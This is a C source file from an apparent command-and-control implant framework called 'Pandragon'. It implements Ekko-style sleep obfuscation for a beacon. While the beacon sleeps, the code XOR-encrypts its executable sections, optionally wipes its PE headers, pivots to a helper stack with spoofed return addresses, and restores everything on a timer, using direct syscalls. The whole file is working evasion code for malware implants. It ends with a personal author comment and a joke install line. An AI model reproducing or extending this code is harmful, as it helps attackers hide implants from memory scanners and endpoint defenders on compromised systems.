#include "../include/sleep_obf.h"
#include "../include/utils.h"
#include "../include/config_parser.h"
#include "../include/pandragon_runtime.h"
#include "../include/resolver.h"
/*
    shhhhhhhhhhhhhhhhhhhhhhhhhhhhhh

            Beacon is SLEEPING!!!!!!!!

*/
/* noinline from utils.h expands to __attribute__((noinline)) which breaks
 * when nested inside __attribute__((section(".obf"), noinline)). */
#undef noinline

/* ---------------------------------------------------------------------------
 * Constants
 * --------------------------------------------------------------------------- */
#define MAX_EKKO_SECTIONS  16
#define EKKO_STACK_SIZE    0x4000       /* 16KB helper stack buffer */
#define XOR_KEY_LENGTH     1024         /* repeating XOR key size */

/* ---------------------------------------------------------------------------
 * Context Structure
 * --------------------------------------------------------------------------- */

typedef struct _EKKO_SECTION_INFO {
    PVOID  base;      /* section VA */
    SIZE_T size;      /* in-memory size of section */
    ULONG  oldProtect; /* original protection (saved during encrypt) */
} EKKO_SECTION_INFO;

typedef struct _EKKO_CONTEXT {
    functionTable*    nt;

    /* Derived XOR key (config_key XOR beacon_id, counter-expanded) */
    uint8_t             xorKey[XOR_KEY_LENGTH];

    /* Sections that got encrypted (need decrypt on wake) */
    EKKO_SECTION_INFO   sections[MAX_EKKO_SECTIONS];
    int                 sectionCount;

    /* PE header backup (if wipe enabled) */
    bool                wipePeHeaders;
    uint8_t             peHeaderBackup[0x1000];
    PVOID               imageBase;
    SIZE_T              imageSize;

    /* Control flags */
    volatile bool       wokeUp;

    /* Thread contexts - MUST BE 16-BYTE ALIGNED ON X64 */
    alignas(16) CONTEXT originalContext; /* Return to main loop */
    alignas(16) CONTEXT pivotContext;    /* Enter waiting loop */

    /* Synchronization */
    HANDLE              doneEvent;

    /* Timer handles */
    HANDLE              timerQueue;
    HANDLE              timer;

    /* Helper stack allocation */
    uint8_t*            helperStack;
    SIZE_T              helperStackSize;

    /* Saved NT_TIB values for restoration */
    PVOID               savedStackBase;
    PVOID               savedStackLimit;
} EKKO_CONTEXT;

/* Global ctx pointer for the waiting loop */
static volatile EKKO_CONTEXT* g_EkkoCtx = NULL;

/* Persistent direct-syscall functionTable for Ekko (reused across sleep cycles) */
static functionTable* g_ekkofuncTable = NULL;

/* ==========================================================================
 * .obf SECTION - Code here stays RX and executable while .text is encrypted
 * ========================================================================== */

__attribute__((section(".obf"), noinline))
static void secureZero(void* buf, SIZE_T len) {
    volatile uint8_t* p = (volatile uint8_t*)buf;
    while (len--) *p++ = 0;
}

__attribute__((section(".obf"), noinline))
static void xorCrypt(uint8_t* data, SIZE_T len, const uint8_t* key, SIZE_T keyLen) {
    for (SIZE_T i = 0; i < len; i++)
        data[i] ^= key[i % keyLen];
}

/* ---------------------------------------------------------------------------
 * TimerCallback - Signal the event to wake up the waiting loop
 * --------------------------------------------------------------------------- */
__attribute__((section(".obf"), noinline))
static void CALLBACK SleepObf_TimerCallback(PVOID lpParameter, BOOLEAN /*TimerOrWaitFired*/) {
    EKKO_CONTEXT* ctx = (EKKO_CONTEXT*)lpParameter;
    if (ctx && ctx->nt && ctx->doneEvent) {
        ctx->nt->NtSetEvent(ctx->doneEvent, NULL);
    }
}

/* ---------------------------------------------------------------------------
 * WaitingLoop - Runs on helper stack while .text is encrypted.
 * This is a pain because we use indirect syscalls.
 * So the solution is to either... disable them... or use unhooked gadgets
 * from ntdll/kernel32.
 *							but what if unhooking is disabled?
 *							Decisions, decisions... TODO.
 * --------------------------------------------------------------------------- */
__attribute__((section(".obf"), noinline))
static void __attribute__((ms_abi)) SleepObf_WaitingLoop() {
    EKKO_CONTEXT* ctx = (EKKO_CONTEXT*)g_EkkoCtx;
    if (!ctx || !ctx->nt) return;

    functionTable* nt = ctx->nt;
    HANDLE hProcess = (HANDLE)-1;

    /* 1. Wait for timer signal */
    nt->NtWaitForSingleObject(ctx->doneEvent, FALSE, NULL);

    /* 2. Decrypt sections (RW -> XOR -> RX) */
    for (int i = 0; i < ctx->sectionCount; i++) {
        PVOID base = ctx->sections[i].base;
        SIZE_T size = ctx->sections[i].size;
        ULONG oldProtect = 0;

        nt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_READWRITE, &oldProtect);
        xorCrypt((uint8_t*)ctx->sections[i].base, ctx->sections[i].size, ctx->xorKey, XOR_KEY_LENGTH);
        base = ctx->sections[i].base;
        size = ctx->sections[i].size;
        nt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_EXECUTE_READ, &oldProtect);
    }

    /* 3. Restore PE headers if wiped */
    if (ctx->wipePeHeaders && ctx->imageBase && ctx->peHeaderBackup[0] != 0) {
        PVOID hdrBase = ctx->imageBase;
        SIZE_T hdrSize = 0x1000;
        ULONG oldProtect = 0;
        nt->NtProtectVirtualMemory(hProcess, &hdrBase, &hdrSize, PAGE_READWRITE, &oldProtect);

        volatile uint8_t* dst = (volatile uint8_t*)ctx->imageBase;
        for (SIZE_T j = 0; j < 0x1000; j++) dst[j] = ctx->peHeaderBackup[j];

        hdrBase = ctx->imageBase;
        nt->NtProtectVirtualMemory(hProcess, &hdrBase, &hdrSize, oldProtect, &oldProtect);
        secureZero(ctx->peHeaderBackup, sizeof(ctx->peHeaderBackup));
    }

    /* 4. Restore original TEB limits before returning to original stack */
    if (ctx->helperStack) {
        PTEB teb = nt->parameters.TEB;
        if (teb) {
            teb->NtTib.StackBase  = ctx->savedStackBase;
            teb->NtTib.StackLimit = ctx->savedStackLimit;
        }
    }

    /* 5. Set wake flag and return to SleepObf_Ekko */
    ctx->wokeUp = true;
    nt->NtContinue(&ctx->originalContext, FALSE);
}

/* ==========================================================================
 * Helper Functions (Preparation)
 * ========================================================================== */

__attribute__((section(".obf"), noinline))
static int enumerateCodeSections(PVOID imageBase, EKKO_SECTION_INFO* sections, int maxSections) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)imageBase + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)((BYTE*)nt + sizeof(IMAGE_NT_HEADERS));

    uintptr_t loopAddr = (uintptr_t)&SleepObf_WaitingLoop;
    int count = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections && count < maxSections; i++) {
        uintptr_t secVA = (uintptr_t)imageBase + sec[i].VirtualAddress;
        SIZE_T secSize = (sec[i].SizeOfRawData > sec[i].Misc.VirtualSize) ? sec[i].SizeOfRawData : sec[i].Misc.VirtualSize;

        /* Skip section containing our .obf safe zone */
        if (loopAddr >= secVA && loopAddr < secVA + secSize) continue;

        if ((sec[i].Characteristics & IMAGE_SCN_CNT_CODE) && (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            sections[count].base = (PVOID)secVA;
            sections[count].size = secSize;
            sections[count].oldProtect = 0;
            count++;
        }
    }
    return count;
}

__attribute__((section(".obf"), noinline))
static void deriveXorKey(uint8_t out[XOR_KEY_LENGTH], const uint8_t configKey[32], const uint8_t beaconId[8]) {
    uint8_t seed[32];
    for (int i = 0; i < 8; i++) seed[i] = configKey[i] ^ beaconId[i];
    for (int i = 8; i < 32; i++) seed[i] = configKey[i];
    for (int i = 0; i < XOR_KEY_LENGTH; i++) out[i] = seed[i % 32] ^ (uint8_t)(i / 32);
}

/* ==========================================================================
 * Main Entry Point: SleepObf_Ekko
 * ========================================================================== */

__attribute__((section(".obf"), noinline))
bool SleepObf_Ekko(functionTable* nt, const BeaconConfig* config, uint32_t sleep_ms, uint8_t jitter_pct) {
    (void)nt;

    if (!config) return false;

    if (!g_ekkofuncTable) {
        g_ekkofuncTable = InitializeFunctionTable(true, true, false, false);
        if (!g_ekkofuncTable) {
            g_debugPrint("[SleepObf_Ekko] Failed to initialize functionTable");
            return false;
        }
        g_debugPrint("[SleepObf_Ekko] Allocated persistent functionTable");
    }

    functionTable* ekkoNt = g_ekkofuncTable;

    EKKO_CONTEXT* ctx = (EKKO_CONTEXT*)ekkoNt->RtlAllocateHeap(ekkoNt->parameters.processHeap, HEAP_ZERO_MEMORY, sizeof(EKKO_CONTEXT));
    if (!ctx) {
        return false;
    }

    ctx->nt = ekkoNt;
    ctx->wipePeHeaders = config->options.sleep_wipe_pe_headers;
    
    PPEB peb = getCurrentPEB();
    ctx->imageBase = ((PLDR_DATA_TABLE_ENTRY)peb->LoaderData->InLoadOrderModuleList.Flink)->DllBase;
    
    ctx->sectionCount = enumerateCodeSections(ctx->imageBase, ctx->sections, MAX_EKKO_SECTIONS);
    deriveXorKey(ctx->xorKey, config->crypto_key, config->beacon_id);

    /* 1. Setup synchronization */
    ekkoNt->NtCreateEvent(&ctx->doneEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE);
    ekkoNt->RtlCreateTimerQueue(&ctx->timerQueue);
    uint32_t sleepTime = ApplySleepJitter(sleep_ms, jitter_pct);
    ekkoNt->RtlCreateTimer(ctx->timerQueue, &ctx->timer, (WAITORTIMERCALLBACK)SleepObf_TimerCallback, ctx, sleepTime, 0, WT_EXECUTEINTIMERTHREAD);

    /* 2. Capture original context (to return here after wake)
     * RtlCaptureContext is better than GetThreadContext(self) for RIP accuracy. */
    ctx->originalContext.ContextFlags = CONTEXT_FULL;
    ekkoNt->RtlCaptureContext(&ctx->originalContext);

    /* TRICK: Check if we just woke up. If so, originalContext was just restored by NtContinue. */
    if (ctx->wokeUp) {
        g_debugPrint("[SleepObf_Ekko] [+] Woke up! Resuming on original stack.");
        g_debugPrint("[SleepObf_Ekko] [+] Restored Rsp=0x%llX Rip=0x%llX",
                     (UINT64)ctx->originalContext.Rsp,
                     (UINT64)ctx->originalContext.Rip);
        
        ekkoNt->NtClose(ctx->doneEvent);
        if (ctx->helperStack) {
            ekkoNt->RtlFreeHeap(ekkoNt->parameters.processHeap, 0, (PVOID)ctx->helperStack);
        }
        ekkoNt->RtlFreeHeap(ekkoNt->parameters.processHeap, 0, (PVOID)ctx);
        return true;
    }

    /* 3. Prepare pivot context (to enter WaitingLoop on helper stack) */
    ctx->pivotContext.ContextFlags = CONTEXT_FULL;
    ekkoNt->RtlCaptureContext(&ctx->pivotContext);
    
    /* Modify pivot context: RIP to WaitingLoop, RSP to helper stack */
    ctx->pivotContext.Rip = (DWORD64)&SleepObf_WaitingLoop;

    if (config->options.sleep_stack_spoof) {
        ctx->helperStackSize = EKKO_STACK_SIZE;
        ctx->helperStack = (uint8_t*)ekkoNt->RtlAllocateHeap(ekkoNt->parameters.processHeap, HEAP_ZERO_MEMORY, ctx->helperStackSize);
        if (ctx->helperStack) {
            /* Collect resolved return addresses from the stack spoof chain.
             * These are pre-resolved by ResolveStackChain() at boot, before
             * .text encryption, using EAT parsing + last-ret scanning. */
            UINT64 frameAddrs[256];
            uint16_t addrCount = 0;
            if (config->stack_chain_count > 0 && config->stack_chain) {
                for (uint16_t ci = 0; ci < config->stack_chain_count && addrCount < 256; ci++) {
                    if (config->stack_chain[ci].resolvedAddr != 0) {
                        frameAddrs[addrCount++] = config->stack_chain[ci].resolvedAddr;
                    }
                }
            }
            if (addrCount > 0) {
                uint16_t numFrames = config->num_spoof_frames;
                if (numFrames == 0) numFrames = 6;
                uint16_t maxFrames = (uint16_t)((ctx->helperStackSize - 0x400) / 0x80);
                if (numFrames > maxFrames) numFrames = maxFrames;
                for (uint16_t i = 0; i < numFrames; i++) {
                    SIZE_T off = 0x100 + (SIZE_T)i * 0x80;
                    if (off + 8 > ctx->helperStackSize - 0x200) break;
                    *(UINT64*)(ctx->helperStack + off) = frameAddrs[i % addrCount];
                }
            } else {
                g_debugPrint("[SleepObf_Ekko] Stack spoof: no resolved chain addresses, TEB swap only");
            }

            ctx->pivotContext.Rsp = (DWORD64)(ctx->helperStack + ctx->helperStackSize - 0x200);

            /* Save original TEB limits (to be restored by WaitingLoop) */
            PTEB teb = ekkoNt->parameters.TEB;
            ctx->savedStackBase = teb->NtTib.StackBase;
            ctx->savedStackLimit = teb->NtTib.StackLimit;
        }
    }

    g_debugPrint("[SleepObf_Ekko] [+] originalContext: Rsp=0x%llX Rip=0x%llX",
                 (UINT64)ctx->originalContext.Rsp, (UINT64)ctx->originalContext.Rip);
    g_debugPrint("[SleepObf_Ekko] [+] pivotContext: Rsp=0x%llX Rip=0x%llX",
                 (UINT64)ctx->pivotContext.Rsp, (UINT64)ctx->pivotContext.Rip);

    /* 4. Encrypt sections (.text -> XOR -> RX) */
    HANDLE hProcess = (HANDLE)-1;
    for (int i = 0; i < ctx->sectionCount; i++) {
        PVOID base = ctx->sections[i].base;
        SIZE_T size = ctx->sections[i].size;
        ULONG oldProtect = 0;
        ekkoNt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_READWRITE, &oldProtect);
        xorCrypt((uint8_t*)ctx->sections[i].base, ctx->sections[i].size, ctx->xorKey, XOR_KEY_LENGTH);
        base = ctx->sections[i].base;
        ekkoNt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_EXECUTE_READ, &oldProtect);
    }

    /* 5. Wipe headers (optional) */
    if (ctx->wipePeHeaders) {
        PVOID hdrBase = ctx->imageBase;
        SIZE_T hdrSize = 0x1000;
        ULONG oldProtect = 0;
        volatile uint8_t* p = (volatile uint8_t*)ctx->imageBase;
        for (SIZE_T j = 0; j < 0x1000; j++) ctx->peHeaderBackup[j] = p[j];
        ekkoNt->NtProtectVirtualMemory(hProcess, &hdrBase, &hdrSize, PAGE_READWRITE, &oldProtect);
        for (SIZE_T j = 0; j < 0x1000; j++) p[j] = 0;
        ekkoNt->NtProtectVirtualMemory(hProcess, &hdrBase, &hdrSize, oldProtect, &oldProtect);
    }

    /* 6. Pivot stack and enter waiting loop */
    g_EkkoCtx = ctx;
    if (ctx->helperStack) {
        PTEB teb = ekkoNt->parameters.TEB;
        teb->NtTib.StackBase = (PVOID)(ctx->helperStack + ctx->helperStackSize);
        teb->NtTib.StackLimit = (PVOID)ctx->helperStack;
    }

    ekkoNt->NtContinue(&ctx->pivotContext, FALSE);
    return true; /* Never reached */
    
}
/*
    Hope no one ever reads this, but working on Pandragon is a honor.
    It is the fruit of a lot of thoughts and efforts, and I hope it leaves
    a lasting mark. Not only because I made it, but because I genuinely do believe
    it can become insanely good and completely change how C2s are designed.
    Though I also have heavy imposter syndrome. My, my.

    Re-reading myself before saving... I must say:
    Everything I have ever done was out of love. It is from the bottom of my heart that
    I deliver this project. As an author I forgot said, in a book I forgot, "I seek to
    start an endeavour beyond all that of which is known to men, so put your hopes in me"
    Or maybe I'm mistranslating.
                                Who's even going to read this?
                                    Nerds.            
    - Serexp.
                    sudo pip instal root-hacker-elite==67.6.7
*/
